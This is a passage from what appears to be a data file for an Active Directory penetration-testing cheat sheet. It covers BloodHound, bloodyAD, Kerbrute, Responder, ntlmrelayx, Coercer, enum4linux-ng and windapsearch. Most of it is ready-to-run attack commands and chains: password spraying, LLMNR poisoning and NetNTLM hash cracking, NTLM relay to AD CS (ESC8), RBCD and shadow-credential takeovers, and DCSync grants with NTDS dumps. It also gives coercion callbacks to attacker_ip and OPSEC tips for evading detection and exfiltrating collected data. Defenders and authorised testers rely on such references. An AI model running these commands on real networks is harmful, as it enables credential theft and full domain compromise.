          },
          {
            title: "Queries worth running",
            type: "table",
            columns: ["Query", "What it surfaces"],
            rows: [
              ["Shortest Paths to Domain Admins", "Every shortest path to a Domain Admins member — usually the first query to run"],
              ["Find Computers where Domain Users are Local Admin", "Broad local-admin exposure across the domain — often a fast win"],
              ["Shortest Paths from Kerberoastable Users", "Whether an SPN account sits on a path to something valuable"],
              ["MATCH p=shortestPath((n)-[*1..]->(g:Group)) WHERE g.objectid ENDS WITH \"-512\" RETURN p", "Cypher: shortest path to Domain Admins (RID 512), typed into the Cypher bar"],
              ["MATCH (n:User {name:\"JDOE@BANK.LOCAL\"})-[r]->(m) RETURN n,r,m", "Cypher: all outbound edges from one principal, once you've picked a start node"]
            ]
          },
          {
            title: "OPSEC & notes",
            type: "notes",
            items: [
              "Prefer -c DCOnly: it only talks LDAP to the DC and never connects to member hosts, avoiding the Session/LoggedOn/LocalGroup SMB sweep that -c All runs against every machine.",
              "The loudest signal is one account LDAP-enumerating the whole directory in seconds — run as a normal user, from a non-DC host, in business hours. SharpHound can --throttle/--jitter; bloodhound-python and nxc cannot, so pace those yourself and keep them to DCOnly.",
              "Don't leave collector output on the target — exfil the .zip off-host and delete it; the JSON is sensitive loot.",
              "No single collector is quietest for every job: AD Explorer blends in as admin tooling, BOFHound keeps collection inside your C2, SOAPHound avoids LDAP entirely by using ADWS — pick by what the environment actually monitors.",
              "Refresh collection periodically on long engagements — ACLs and memberships change, and a stale graph shows paths that no longer exist.",
              "BloodHound CE replaced the legacy Neo4j-desktop edition; all three collectors here feed the same CE .zip format (nxc defaults to the CE collector).",
              "Treat every edge as a lead to verify — confirm a path (e.g. with NetExec) before relying on it during an engagement."
            ]
          }
        ]
      },
      {
        id: "bloodyad",
        name: "bloodyAD",
        url: "https://github.com/CravateRouge/bloodyAD",
        description: "AD privilege-escalation swiss-army knife — reads and writes almost any AD object or attribute directly over LDAP.",
        brief: "bloodyAD talks straight to LDAP (or LDAPS) instead of wrapping other tools, and can authenticate with a password, an NTLM hash, a Kerberos ticket, or a certificate. Once authenticated, it reads and writes nearly any AD object or attribute a controlled principal has rights to — group membership, passwords, computer accounts, shadow credentials, RBCD, DCSync rights, UAC flags, SPNs, and more — all through one consistent verb/object syntax (add / get / set / remove <object> <target> ...).\n\nIt's the tool that turns a BloodHound edge (GenericAll, WriteDacl, WriteOwner, AddSelf, AddMember, GenericWrite, etc.) into an actual action. Find the edge in BloodHound, then execute it here.",
        quickReference: [
          { label: "See what the current user can actually write", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> get writable" },
          { label: "Add yourself to a group", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add groupMember <group> user" },
          { label: "Reset a user's password", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> set password <target_user> 'NewPass123!'" },
          { label: "Add a computer account (up to MachineAccountQuota)", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add computer EVILPC 'Passw0rd123!'" },
          { label: "Grant yourself DCSync rights", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add dcsync user" }
        ],
        sections: [
          {
            title: "Connecting & Authentication",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d / --domain <domain>", "Target domain"],
              ["--host <dc_ip_or_fqdn>", "Domain controller to bind against"],
              ["-u / --username <user>", "Username to authenticate as"],
              ["-p / --password <pass>", "Password auth"],
              ["-p ':<LM>:<NT>'", "NTLM pass-the-hash auth — same flag, hash instead of a cleartext password"],
              ["-k / --kerberos", "Use Kerberos instead of NTLM — pulls a ticket from the KRB5CCNAME ccache"],
              ["-c / --certificate <cert.pfx>", "Authenticate via PKINIT using a certificate (pairs directly with Certipy/shadow credentials output)"],
              ["-s ldaps://<dc>", "Force LDAPS instead of plaintext LDAP — required if the DC enforces channel binding"]
            ]
          },
          {
            title: "Reading Objects",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["get writable", "List every object/attribute the authenticated principal can currently write — the single best recon command in the tool"],
              ["get object <target> [--attr <attr>]", "Dump every attribute of an object, or just one specific attribute"],
              ["get children <target>", "List child objects of a container/OU"],
              ["get membership <target>", "Resolve a principal's full effective group membership, including nested groups"],
              ["get search <ldap_filter> --attr <attr>", "Raw LDAP search when you need a filter bloodyAD doesn't have a dedicated verb for"]
            ]
          },
          {
            title: "Group & Account Management",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add groupMember <group> <member>", "Add a user/computer to a group (AddMember / AddSelf edges)"],
              ["remove groupMember <group> <member>", "Remove a member from a group"],
              ["add user <name> <password>", "Create a new user object"],
              ["add computer <name> <password>", "Create a new computer account — every authenticated user can do this up to ms-DS-MachineAccountQuota (default 10)"],
              ["set password <target> <new_password>", "Reset a target account's password — needs User-Force-Change-Password / GenericAll-style rights"],
              ["remove object <target>", "Delete an object outright — needs strong rights, use carefully"],
              ["set owner <target> <new_owner>", "Change an object's owner — often the first move once WriteOwner is available"]
            ]
          },
          {
            title: "ACL / Rights Abuse",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add genericAll <target> <trustee>", "Grant a trustee GenericAll over a target object — the classic \"turn one edge into full control\" move"],
              ["remove genericAll <target> <trustee>", "Revoke it again — good cleanup practice once you're done"],
              ["add dcsync <trustee>", "Grant a trustee the Replicating Directory Changes / All rights needed for DCSync"],
              ["remove dcsync <trustee>", "Revoke DCSync rights"],
              ["add uac <target> -f ACCOUNTDISABLE", "Flip a UserAccountControl flag off — e.g. re-enable a disabled account (prefix with remove to flip it on)"]
            ]
          },
          {
            title: "Shadow Credentials & Certificates",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add shadowCredentials <target>", "Add a msDS-KeyCredentialLink to a target account without touching its password, then authenticate via PKINIT"],
              ["remove shadowCredentials <target> <device_id>", "Remove a specific key credential — cleanup after the attack"],
              ["add altSecID <target> <mapping_string>", "Write an explicit certificate mapping into altSecurityIdentities (ESC14-style abuse, if the attribute is writable)"]
            ]
          },
          {
            title: "Resource-Based Constrained Delegation (RBCD)",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["add rbcd <target_computer> <controlled_principal>", "Set msDS-AllowedToActOnBehalfOfOtherIdentity so the controlled principal can impersonate anyone against the target computer"],
              ["remove rbcd <target_computer> <controlled_principal>", "Remove that delegation — clean up once the follow-on Rubeus s4u step is done"],
              ["Typical pairing", "add computer (to create a controlled principal) → add rbcd → Rubeus s4u /impersonateuser:administrator to get a usable ticket"]
            ]
          },
          {
            title: "gMSA & Kerberos-Adjacent Attributes",
            type: "table",
            columns: ["Command", "Description"],
            rows: [
              ["get object <gmsa_dn> --attr msDS-ManagedPassword", "Read a gMSA's managed password blob (needs read rights on the attribute — decode downstream with Certipy/NetExec-style tooling)"],
              ["add spn <target> <spn_value>", "Give a target account an SPN, making it Kerberoastable even if it wasn't before"],
              ["remove spn <target> <spn_value>", "Remove the SPN again once done"],
              ["add uac <target> -f DONT_REQ_PREAUTH", "Disable Kerberos pre-auth on a target, making it ASREPRoastable"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Recon-to-action: find and use a writable edge", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> get writable\n# spot e.g. GenericAll over a group you're not in:\nbloodyAD -d corp.local -u user -p pass --host <dc> add groupMember <group> user" },
              { label: "Full RBCD abuse chain", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add computer EVILPC 'Passw0rd123!'\nbloodyAD -d corp.local -u user -p pass --host <dc> add rbcd <target_computer> 'EVILPC$'\nRubeus.exe s4u /user:EVILPC$ /rc4:<evilpc_nt_hash> /impersonateuser:administrator /msdsspn:cifs/<target_computer> /ptt" },
              { label: "Shadow credentials → PKINIT hash recovery", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add shadowCredentials target_user\n# outputs a .pfx — feed it into Certipy:\ncertipy auth -pfx target_user.pfx -dc-ip <dc>" },
              { label: "DCSync rights grant + dump", cmd: "bloodyAD -d corp.local -u user -p pass --host <dc> add dcsync user\nnxc smb <dc> -u user -p pass --ntds" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "bloodyAD doesn't grant rights out of nowhere — every abuse here still needs a real starting edge (GenericAll, WriteDacl, WriteOwner, AddMember, etc.). Run BloodHound first to find it, then use bloodyAD to actually execute it.",
              "ms-DS-MachineAccountQuota defaults to 10 — any authenticated domain user can add up to that many computer accounts unless it's been explicitly lowered.",
              "bloodyAD's LDAP-native design makes it a clean choice as the payload for an NTLM relay (e.g. ntlmrelayx.py -c 'bloodyAD ... add groupMember ...') instead of relaying to SMB/HTTP.",
              "Always clean up what you added (group membership, RBCD, shadow credentials, SPNs) once the engagement or lab session is done — these are real, persistent changes to the directory."
            ]
          }
        ]
      },
      {
        id: "kerbrute",
        name: "Kerbrute",
        url: "https://github.com/ropnop/kerbrute",
        description: "Fast Kerberos pre-auth username enumeration and password spraying against a DC.",
        brief: "Kerbrute abuses Kerberos pre-authentication to do two things quietly: confirm which usernames exist in a domain, and spray passwords against them. Because a pre-auth request for a non-existent user returns a different error than one for a valid user, you can enumerate accounts without a single logon event being generated — failed Kerberos pre-auth is far quieter than failed SMB or LDAP binds.\n\nIt is usually the first tool pointed at a domain controller once you have a username list (from OSINT, document metadata, or a naming convention) but no credentials yet.",
        quickReference: [
          { label: "Enumerate valid usernames", cmd: "kerbrute userenum -d target.local --dc 10.10.10.10 users.txt" },
          { label: "Spray one password across many users", cmd: "kerbrute passwordspray -d target.local --dc 10.10.10.10 users.txt 'Winter2026!'" },
          { label: "Brute one user (careful — lockout)", cmd: "kerbrute bruteuser -d target.local --dc 10.10.10.10 passwords.txt jdoe" },
          { label: "Test a list of user:pass combos", cmd: "kerbrute bruteforce -d target.local --dc 10.10.10.10 combos.txt" }
        ],
        sections: [
          {
            title: "Modes",
            type: "table",
            columns: ["Mode", "What it does"],
            rows: [
              ["userenum", "Confirm which usernames exist — no password attempt, generates no logon failure"],
              ["passwordspray", "Try one password against every user in the list — the safe direction for avoiding lockouts"],
              ["bruteuser", "Try many passwords against one user — high lockout risk, use only with a known policy"],
              ["bruteforce", "Read user:password pairs from a file or stdin"]
            ]
          },
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-d <domain>", "Target Kerberos realm (the AD domain FQDN)"],
              ["--dc <ip>", "Domain controller to talk to; if omitted, Kerbrute resolves it via DNS"],
              ["-o <file>", "Write results to a file"],
              ["-t <n>", "Threads (default 10) — raise cautiously, a DC will notice a flood"],
              ["--delay <ms>", "Delay between attempts, to stay under detection thresholds"],
              ["--safe", "Abort the whole spray if any account comes back locked out"],
              ["-v", "Verbose — show every attempt, including the failures"]
            ]
          },
          {
            title: "Why It Is Quiet",
            type: "table",
            columns: ["Concept", "Description"],
            rows: [
              ["Pre-auth error codes", "A missing user returns PRINCIPAL_UNKNOWN; a valid user with a wrong password returns PREAUTH_FAILED — the difference is what enumeration reads"],
              ["No 4625 by default", "AS-REQ failures do not produce a standard failed-logon event on older configs, unlike SMB/LDAP"],
              ["Detection reality", "Modern DCs can log 4768 with failure codes; a burst of AS-REQs from one host is detectable if anyone is looking"],
              ["Lockout still applies", "Kerberos pre-auth failures increment the badPwdCount — spraying too fast still locks accounts"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Enumerate then spray", cmd: "# 1. build a username list from OSINT / naming convention\n# 2. confirm which ones exist\nkerbrute userenum -d target.local --dc 10.10.10.10 -o valid.txt users.txt\n# 3. spray ONE password against only the valid users\nkerbrute passwordspray -d target.local --dc 10.10.10.10 \\\n  $(awk '{print $NF}' valid.txt) 'Autumn2026!' --safe" },
              { label: "Generate the username permutations first", cmd: "# from 'John Doe' produce jdoe, john.doe, johnd, doej ...\n# username-anarchy or a small script, then feed the list to userenum" },
              { label: "Respect the lockout policy", cmd: "# read the policy before spraying:\nnetexec smb 10.10.10.10 -u '' -p '' --pass-pol\n# spray one attempt, then wait out the observation window before the next" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Always read the account lockout policy before spraying. One password per observation window per user is the rule that keeps you from locking out the domain.",
              "userenum needs no credentials at all — it is a pre-auth operation, which makes it a legitimate first step against a domain you can reach but cannot yet authenticate to.",
              "Spraying is a detection event on a mature network. Space attempts out with --delay and prefer a single well-chosen seasonal password over a wordlist.",
              "Feed valid users straight into AS-REP roasting — some of the accounts Kerbrute confirms will have pre-auth disabled.",
              "See the AS-REP Roasting and Kerberos theory pages for what the pre-auth exchange actually is."
            ]
          }
        ]
      },
      {
        id: "responder",
        name: "Responder",
        url: "https://github.com/lgandx/Responder",
        description: "Poisons LLMNR/NBT-NS/mDNS to capture NetNTLM hashes on the local segment.",
        brief: "Responder is a rogue responder for Windows' name-resolution fallback protocols. When a Windows host fails to resolve a name over DNS, it broadcasts an LLMNR/NBT-NS/mDNS query to the whole segment asking 'does anyone know where SHARE01 is?' — and Responder answers 'yes, it's me', collecting the NetNTLM authentication the victim then offers.\n\nIt is the classic opening move on an internal network: sit on the wire, poison broadcast name resolution, and harvest hashes to crack offline or relay onward. Everything it does is loud on the local segment, so it belongs in the active phase of an engagement.",
        quickReference: [
          { label: "Standard analyze-then-poison run", cmd: "sudo responder -I eth0 -w -d" },
          { label: "Listen only, poison nothing (recon)", cmd: "sudo responder -I eth0 -A" },
          { label: "Disable SMB/HTTP to relay instead", cmd: "sudo responder -I eth0 (with SMB=Off, HTTP=Off in Responder.conf)" },
          { label: "Where captured hashes land", cmd: "/usr/share/responder/logs/  (and the SQLite DB)" }
        ],
        sections: [
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-I <iface>", "Interface to bind to — required"],
              ["-A", "Analyze mode: watch and log poisoning opportunities without actually responding"],
              ["-w", "Start the WPAD rogue proxy server — catches browsers auto-detecting a proxy"],
              ["-d", "Answer DHCP requests to poison via DNS as well (aggressive)"],
              ["-f", "Fingerprint the host that queried (OS, version)"],
              ["-v", "Verbose output"],
              ["-F", "Force WPAD auth even where not strictly required"]
            ]
          },
          {
            title: "The Poisoned Protocols",
            type: "table",
            columns: ["Protocol", "What it is"],
            rows: [
              ["LLMNR (UDP 5355)", "Link-Local Multicast Name Resolution — the primary DNS fallback on modern Windows"],
              ["NBT-NS (UDP 137)", "NetBIOS Name Service — the older fallback, still enabled on many networks"],
              ["mDNS (UDP 5353)", "Multicast DNS — another name-resolution path Responder can answer"],
              ["WPAD", "Web Proxy Auto-Discovery — clients ask for a proxy config; the rogue proxy prompts for auth"]
            ]
          },
          {
            title: "What You Capture",
            type: "table",
            columns: ["Item", "Notes"],
            rows: [
              ["NetNTLMv2 hashes", "The common case — crackable offline with hashcat mode 5600, not pass-the-hash-able"],
              ["NetNTLMv1 hashes", "If a host is misconfigured for v1 (hashcat 5500) — can be downgraded to NTLM and is far weaker"],
              ["Cleartext (rare)", "Basic-auth prompts over the rogue HTTP/WPAD server occasionally yield plaintext"],
              ["Why not pass-the-hash", "NetNTLM is a challenge-response hash, not the NT hash — you crack it or relay it, you do not replay it"]
            ]
          },
          {
            title: "Capture vs Relay",
            type: "table",
            columns: ["Mode", "Setup"],
            rows: [
              ["Capture", "Default — Responder's own SMB/HTTP servers accept the auth and log the hash for offline cracking"],
              ["Relay", "Turn SMB=Off and HTTP=Off in Responder.conf so ntlmrelayx can take the auth instead and forward it live"],
              ["When to relay", "When the captured hash is uncrackable, or when SMB signing is off on a target worth relaying to"],
              ["Coexistence", "Responder poisons (gets the victim to connect); ntlmrelayx handles the forwarded authentication"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Passive recon before poisoning", cmd: "# see how much LLMNR/NBT-NS traffic exists before you make noise\nsudo responder -I eth0 -A\n# if the segment is chatty, poisoning will be productive" },
              { label: "Capture and crack", cmd: "sudo responder -I eth0 -wd\n# hashes accumulate in /usr/share/responder/logs/\nhashcat -m 5600 SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt" },
              { label: "Hand off to relay", cmd: "# in /usr/share/responder/Responder.conf set SMB = Off and HTTP = Off\nsudo responder -I eth0\n# in another terminal:\nntlmrelayx.py -tf targets.txt -smb2support" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "This is loud and it touches other people's machines on the segment. It is firmly an active-phase tool and needs explicit authorisation.",
              "NetNTLMv2 is challenge-response — you cannot pass-the-hash it. Crack it offline or relay it live; those are the only two options.",
              "If you plan to relay, remember to switch Responder's own SMB and HTTP servers off first, or it will grab the auth before ntlmrelayx can.",
              "Analyze mode (-A) is a legitimate low-noise recon step: it tells you whether poisoning will even be productive before you commit to the noise.",
              "See the Coercion & NTLM Relay theory page for how capture and relay fit into a full attack chain."
            ]
          }
        ]
      },
      {
        id: "ntlmrelayx",
        name: "ntlmrelayx",
        url: "https://github.com/fortra/impacket",
        description: "Relays coerced or poisoned NTLM authentication to other services in real time.",
        brief: "ntlmrelayx (part of Impacket) takes an NTLM authentication that a victim was tricked into starting — via Responder poisoning or a coercion technique — and forwards it, live, to a service that will accept it. Because the relayed authentication carries the victim's identity, anything that victim can do, you can now do: dump the SAM, add a computer account, write to LDAP, or authenticate to AD CS for a certificate.\n\nIt is the pivot that turns a captured hash you cannot crack into direct action, and it is the reason SMB signing and channel binding exist.",
        quickReference: [
          { label: "Relay to SMB targets, dump SAM", cmd: "ntlmrelayx.py -tf targets.txt -smb2support" },
          { label: "Relay to LDAP, dump the domain", cmd: "ntlmrelayx.py -t ldap://dc01 --dump-adcs" },
          { label: "Relay to AD CS web enrolment (ESC8)", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" },
          { label: "Relay + RBCD takeover of a computer", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" },
          { label: "Interactive SMB session on success", cmd: "ntlmrelayx.py -tf targets.txt -smb2support -i" }
        ],
        sections: [
          {
            title: "Target Selection",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <target>", "Single target — protocol matters: smb://, ldap://, ldaps://, http://, mssql://"],
              ["-tf <file>", "List of targets, one per line"],
              ["-smb2support", "Enable SMB2 — needed for essentially all modern Windows targets"],
              ["-i", "Drop to an interactive session on a successful relay"],
              ["-socks", "Open a SOCKS proxy multiplexing all successful relayed sessions"],
              ["-wh <host> / -wa", "Serve a rogue WPAD to widen the pool of victims"]
            ]
          },
          {
            title: "Attack Modes",
            type: "table",
            columns: ["Flag", "What it achieves"],
            rows: [
              ["(default SMB)", "Dump the SAM and LSA secrets of the relayed-to host"],
              ["-e / -c", "Execute a payload or command on the target"],
              ["--dump-adcs", "Enumerate AD CS from a relayed LDAP session"],
              ["--adcs --template <t>", "Relay to the CA web endpoint and enrol a cert as the victim (ESC8)"],
              ["--delegate-access", "Configure RBCD so a computer account you control can impersonate on the target"],
              ["--add-computer", "Create a new machine account via the relayed LDAP session"],
              ["--escalate-user <u>", "Grant a chosen user DCSync rights when relaying a privileged account to LDAP"]
            ]
          },
          {
            title: "Why Relaying Works (and When It Fails)",
            type: "table",
            columns: ["Condition", "Effect"],
            rows: [
              ["SMB signing not required", "SMB relay works — this is the classic misconfiguration"],
              ["SMB signing required", "SMB relay fails; pivot to LDAP or AD CS targets instead"],
              ["LDAP channel binding off", "LDAPS relay works — enables RBCD and Shadow Credential attacks"],
              ["EPA not enforced on AD CS web", "ESC8 relay to certsrv works — yields a cert, then a TGT"],
              ["Same-host relay blocked", "You cannot relay a host's auth back to itself (MS08-068 era fix) — relay elsewhere"]
            ]
          },
          {
            title: "Coercion Pairings",
            type: "table",
            columns: ["Coercion source", "Typical relay target"],
            rows: [
              ["Responder (LLMNR/NBT-NS)", "Any SMB target with signing off"],
              ["PetitPotam / Coercer (MS-EFSRPC)", "AD CS web enrolment for ESC8 — DC auth to a cert"],
              ["PrinterBug (MS-RPRN)", "LDAP for RBCD against the coerced machine"],
              ["DFSCoerce (MS-DFSNM)", "Whichever service is unsigned and useful"],
              ["WebDAV coercion", "LDAPS, because WebDAV auth is HTTP and cross-protocol relays cleanly"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Find unsigned targets first", cmd: "# only hosts without SMB signing are relay targets\nnetexec smb 10.10.10.0/24 --gen-relay-list targets.txt\nntlmrelayx.py -tf targets.txt -smb2support -i" },
              { label: "ESC8 — coerce a DC, relay to the CA, get a TGT", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support \\\n  --adcs --template DomainController\n# in another terminal, coerce the DC:\nPetitPotam.py -u user -p pass attacker_ip dc01_ip\n# then use the issued cert:\ncertipy auth -pfx dc01.pfx" },
              { label: "RBCD takeover via LDAP relay", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access --no-dump\n# coerce the target computer to authenticate; ntlmrelayx configures RBCD\n# then impersonate:\ngetST.py -spn cifs/target -impersonate Administrator domain/attacker_pc\\$" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Relaying only works where a protection is missing: SMB signing off, LDAP channel binding off, or EPA not enforced on AD CS web. Enumerate those conditions first — netexec's --gen-relay-list does the SMB part.",
              "You cannot relay authentication back to the host it came from. Always relay to a different, useful target.",
              "The AD CS ESC8 path is the highest-impact relay on most domains: coerce a DC, relay its machine auth to the CA, and receive a certificate you can turn into a TGT.",
              "Pair it with Coercer or PetitPotam to generate the authentication on demand rather than waiting for Responder to catch one.",
              "See the Coercion & NTLM Relay and AD CS theory pages for the full mechanism."
            ]
          }
        ]
      },
      {
        id: "coercer",
        name: "Coercer",
        url: "https://github.com/p0dalirius/Coercer",
        description: "Forces a Windows host to authenticate to you across many coercion RPC methods.",
        brief: "Coercer automates authentication coercion: it calls remote procedures on a target that, by design, make that target connect back to a UNC path you specify — and when it connects, it authenticates as the machine account. Point that callback at Responder or ntlmrelayx and you have the victim's authentication.\n\nWhere older tools each abused a single method (PrinterBug, PetitPotam), Coercer sprays every known coercion vector across MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP and more, so if any one is reachable, it fires.",
        quickReference: [
          { label: "Coerce a host to authenticate to you", cmd: "coercer coerce -t dc01.target.local -l attacker_ip -u user -p pass -d target.local" },
          { label: "Scan which methods are available", cmd: "coercer scan -t dc01.target.local -u user -p pass -d target.local" },
          { label: "Fuzz for undocumented coercion paths", cmd: "coercer fuzz -t dc01.target.local -u user -p pass -d target.local" },
          { label: "Coerce authenticated as a machine account", cmd: "coercer coerce -t dc01 -l attacker_ip -u 'PC$' -H :<hash> -d target.local" }
        ],
        sections: [
          {
            title: "Modes",
            type: "table",
            columns: ["Mode", "What it does"],
            rows: [
              ["scan", "Test which coercion methods respond on the target without triggering a full callback"],
              ["coerce", "Actually trigger the callbacks to your listener — the attack"],
              ["fuzz", "Probe RPC methods systematically to find coercion paths not yet catalogued"]
            ]
          },
          {
            title: "Coercion Protocols",
            type: "table",
            columns: ["Protocol", "Classic name / method"],
            rows: [
              ["MS-RPRN", "PrinterBug — the print spooler's RpcRemoteFindFirstPrinterChangeNotification"],
              ["MS-EFSRPC", "PetitPotam — the Encrypting File System remote protocol (EfsRpcOpenFileRaw and others)"],
              ["MS-DFSNM", "DFSCoerce — the Distributed File System namespace management interface"],
              ["MS-FSRVP", "ShadowCoerce — the File Server VSS agent"],
              ["MS-EVEN", "The remote EventLog interface, ElfrOpenBELW"],
              ["Why so many", "Each is a separate patch/config surface; Coercer tries all of them so one missing hardening is enough"]
            ]
          },
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-t <target>", "Host to coerce"],
              ["-l <listener>", "Where the victim should authenticate back to (your Responder/relay host)"],
              ["-u / -p / -d", "Credentials and domain — coercion usually needs an authenticated context"],
              ["-H <hash>", "Authenticate with an NT hash instead of a password"],
              ["--filter-method-name <s>", "Restrict to specific RPC methods"],
              ["--auth-type", "Choose the callback transport — SMB or HTTP (HTTP/WebDAV enables cross-protocol relay)"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "Coerce a DC into an ESC8 relay", cmd: "# listener: ntlmrelayx to the CA web endpoint\nntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# coerce:\ncoercer coerce -t dc01.target.local -l attacker_ip -u user -p pass -d target.local" },
              { label: "WebDAV coercion for cross-protocol LDAPS relay", cmd: "coercer coerce -t target01 -l attacker_ip@80/share \\\n  -u user -p pass -d target.local --auth-type http\n# WebDAV auth is HTTP, which relays cleanly to LDAPS for RBCD" },
              { label: "Scan first to avoid noise", cmd: "coercer scan -t dc01.target.local -u user -p pass -d target.local\n# fire coerce only against the methods that responded" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Coercion needs somewhere to send the authentication. Stand up Responder or ntlmrelayx before you coerce, or the callback lands nowhere.",
              "Machine accounts authenticate on coercion, which is why coercing a domain controller is so powerful — a DC's machine account is a high-value identity to relay.",
              "WebDAV (HTTP) callbacks relay to LDAPS cleanly, sidestepping SMB signing entirely — the preferred route to RBCD and Shadow Credentials.",
              "scan mode is the low-noise recon step; fuzz mode is loud and may crash the target's service, so keep it out of production windows.",
              "See the Coercion & NTLM Relay theory page for the end-to-end chain."
            ]
          }
        ]
      },
      {
        id: "enum4linux-ng",
        name: "enum4linux-ng",
        url: "https://github.com/cddmp/enum4linux-ng",
        description: "Rewritten SMB/RPC enumeration — users, shares, groups, and password policy.",
        brief: "enum4linux-ng is a modern rewrite of the classic enum4linux, pulling everything reachable over SMB and MS-RPC into one structured report: the domain SID, user and group lists (including via RID cycling), shares, the password policy, and OS details. It is the fast first look at a Windows host or domain, and it works with a null session, a guest session, or real credentials.\n\nThe value is breadth in one command — it saves you running a dozen rpcclient queries by hand — and the YAML/JSON output means the result is greppable rather than a wall of text.",
        quickReference: [
          { label: "Full enumeration of a host", cmd: "enum4linux-ng -A 10.10.10.10" },
          { label: "Null-session attempt", cmd: "enum4linux-ng -A -u '' -p '' 10.10.10.10" },
          { label: "Authenticated enumeration", cmd: "enum4linux-ng -A -u jdoe -p 'Passw0rd' 10.10.10.10" },
          { label: "RID cycling to enumerate users", cmd: "enum4linux-ng -R 10.10.10.10" },
          { label: "Machine-readable output", cmd: "enum4linux-ng -A -oJ result 10.10.10.10" }
        ],
        sections: [
          {
            title: "Key Flags",
            type: "table",
            columns: ["Flag", "Description"],
            rows: [
              ["-A", "Do everything — the usual starting point"],
              ["-U / -G / -S", "Users / groups / shares only"],
              ["-P", "Password and lockout policy — read this before any spray"],
              ["-R", "RID cycling — enumerate accounts by walking SIDs when direct listing is blocked"],
              ["-u / -p", "Username and password ('' '' for a null session)"],
              ["-oJ / -oY", "Write JSON or YAML output"],
              ["-d", "Be more detailed where the protocol allows"]
            ]
          },
          {
            title: "What It Retrieves",
            type: "table",
            columns: ["Item", "Notes"],
            rows: [
              ["Domain SID", "The prefix every account SID shares — the basis for RID cycling"],
              ["Users", "Via RPC enumeration or RID cycling; the raw material for spraying and roasting"],
              ["Groups + members", "Including Domain Admins and other high-value groups where readable"],
              ["Shares", "Names and, where possible, read/write access — feeds share hunting"],
              ["Password policy", "Length, complexity, lockout threshold and window — the spray safety numbers"],
              ["OS info", "Version and build, for matching against known vulnerabilities"],
              ["NetBIOS / workgroup", "Domain membership and naming"]
            ]
          },
          {
            title: "Session Types",
            type: "table",
            columns: ["Session", "What you get"],
            rows: [
              ["Null session (-u '' -p '')", "Anonymous — sometimes still yields users, policy, and shares on legacy configs"],
              ["Guest", "Where the guest account is enabled — a surprising amount is often readable"],
              ["Authenticated", "Any valid domain credential unlocks full RPC enumeration"],
              ["Modern reality", "Null sessions are locked down on current Windows; expect to need at least one credential"]
            ]
          },
          {
            title: "Common Workflows",
            type: "commands",
            commands: [
              { label: "First look at an unknown host", cmd: "enum4linux-ng -A 10.10.10.10 -oY host10\n# read the password policy section before doing anything active" },
              { label: "Build a user list with no creds", cmd: "# if null/guest gives a domain SID, cycle RIDs for usernames\nenum4linux-ng -R 10.10.10.10 | tee users_raw.txt\ngrep -oE '[A-Za-z0-9._-]+\\\\[A-Za-z0-9._-]+' users_raw.txt | cut -d\\\\ -f2 | sort -u > users.txt" },
              { label: "Hand off to spraying", cmd: "# policy from -P tells you the safe rate; users from -R/-U feed kerbrute\nkerbrute passwordspray -d target.local --dc 10.10.10.10 users.txt 'Season2026!'" }
            ]
          },
          {
            title: "Notes & Tips",
            type: "notes",
            items: [
              "Read the password policy before any spray or brute. enum4linux-ng surfaces it in one flag; ignoring it is how engagements lock out the domain.",
              "Null and guest sessions are mostly closed on modern Windows. Do not conclude a host is hardened just because the anonymous run came back empty — retry authenticated.",
              "RID cycling is the fallback when direct user enumeration is blocked but you have the domain SID; it is slower but frequently works when -U does not.",
              "The YAML output is genuinely useful — keep it as evidence and grep it later rather than re-running the scan.",
              "netexec covers much of the same ground with a different feel; running both and comparing is normal."
            ]
          }
        ]
      },
      {
        id: "windapsearch",
        name: "windapsearch",
        url: "https://github.com/ropnop/go-windapsearch",
        description: "Targeted LDAP queries for common AD objects from the command line.",
        brief: "windapsearch runs the LDAP queries you reach for constantly — all users, all computers, privileged accounts, Kerberoastable accounts, unconstrained-delegation hosts — as named subcommands, so you do not have to hand-write LDAP filters. Where ldapdomaindump takes everything, windapsearch is surgical: ask one question, get one clean answer, pipe it onward.\n\nThe Go rewrite is a single static binary, which makes it convenient to drop onto a jump host with no Python dependencies.",
        quickReference: [
          { label: "All domain users", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m users" },
          { label: "Privileged users", cmd: "windapsearch -d target.local -u jdoe@target.local -p pass -m privileged-users" },
